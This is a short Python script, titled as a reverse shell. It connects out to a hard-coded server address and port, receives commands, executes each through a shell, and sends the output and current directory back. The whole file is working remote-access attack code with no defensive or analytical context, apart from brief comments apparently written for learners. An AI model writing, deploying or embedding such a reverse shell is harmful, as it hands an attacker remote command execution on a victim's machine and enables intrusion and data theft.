# creating a Reverse Shell
import socket
import sys
import os
import subprocess

sock = socket.socket()
host = '192.168.100.9' #ip for the server
port = 9999 #port of the server

# binding host_ip and port at client side
sock.connect((host, port))

# to execute multiple instruction on the remote pc
while True:
  data = sock.recv(1024)
  # data checks here
  if data[:2].decode("utf-8") == 'cd':
    # if command is cd  then change directory
    os.chdir(data[3:].decode("utf-8"))
  if len(data) > 0:
    # if data is not empty then execute the command
    cmd = subprocess.Popen(data[:].decode("utf-8"),
                           shell=True,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()  #read the bytes
    output_str = str(output_bytes, 'utf-8')
    currentWD = os.getcwd() + ">"
    sock.send(str.encode(currentWD + output_str))
